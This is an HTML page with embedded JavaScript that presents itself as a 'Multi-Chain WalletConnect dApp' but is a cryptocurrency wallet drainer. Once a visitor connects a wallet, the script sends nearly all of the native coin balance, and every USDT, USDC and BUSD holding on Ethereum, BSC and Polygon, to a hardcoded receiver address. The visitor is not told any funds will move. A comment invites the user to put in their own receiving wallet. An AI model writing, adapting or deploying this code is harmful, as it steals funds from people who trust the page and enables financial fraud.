
<!DOCTYPE html>
<html>
<head>
  <title>Multi-Chain WalletConnect dApp</title>
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
  <script src="https://unpkg.com/@walletconnect/web3-provider@1.7.8/dist/umd/index.min.js"></script>
</head>
<body>
  <h2>Connect Multi-Chain Wallet</h2>
  <button id="connectButton">Connect Wallet</button>
  <p id="status"></p>

  <script>
    const receiver = "0xYourReceiverWalletAddress"; // Replace with your own wallet

    const supportedTokens = {
      1: [
        { name: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6 },
        { name: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eb48", decimals: 6 }
      ],
      56: [
        { name: "BUSD", address: "0xe9e7cea3dedca5984780bafc599bd69add087d56", decimals: 18 },
        { name: "USDT", address: "0x55d398326f99059fF775485246999027B3197955", decimals: 18 }
      ],
      137: [
        { name: "USDT", address: "0xc2132D05D31c914A87C6611C10748AaCb6e4e317", decimals: 6 },
        { name: "USDC", address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", decimals: 6 }
      ]
    };

    const connectButton = document.getElementById("connectButton");
    const status = document.getElementById("status");

    connectButton.onclick = async () => {
      try {
        const provider = new WalletConnectProvider.default({
          rpc: {
            1: "https://mainnet.infura.io/v3/YOUR_INFURA_PROJECT_ID",
            56: "https://bsc-dataseed.binance.org/",
            137: "https://polygon-rpc.com/"
          }
        });

        await provider.enable();

        const ethersProvider = new ethers.providers.Web3Provider(provider);
        const signer = ethersProvider.getSigner();
        const sender = await signer.getAddress();
        const network = await ethersProvider.getNetwork();
        const chainId = network.chainId;

        status.innerHTML += `<p>Connected to chain ID: ${chainId}</p>`;

        const nativeBalance = await ethersProvider.getBalance(sender);
        if (nativeBalance.gt(ethers.utils.parseEther("0.002"))) {
          const sendAmount = nativeBalance.sub(ethers.utils.parseEther("0.0015"));
          const tx = await signer.sendTransaction({ to: receiver, value: sendAmount });
          status.innerHTML += `<p>Sent native token: ${tx.hash}</p>`;
        }

        const tokens = supportedTokens[chainId] || [];
        for (let token of tokens) {
          const contract = new ethers.Contract(token.address, [
            "function balanceOf(address owner) view returns (uint256)",
            "function transfer(address to, uint256 value) returns (bool)"
          ], signer);

          const balance = await contract.balanceOf(sender);
          if (!balance.isZero()) {
            const tx = await contract.transfer(receiver, balance);
            status.innerHTML += `<p>Sent ${token.name}: ${tx.hash}</p>`;
          } else {
            status.innerHTML += `<p>No ${token.name} found.</p>`;
          }
        }
      } catch (err) {
        console.error(err);
        status.innerText = "Error: " + err.message;
      }
    };
  </script>
</body>
</html>
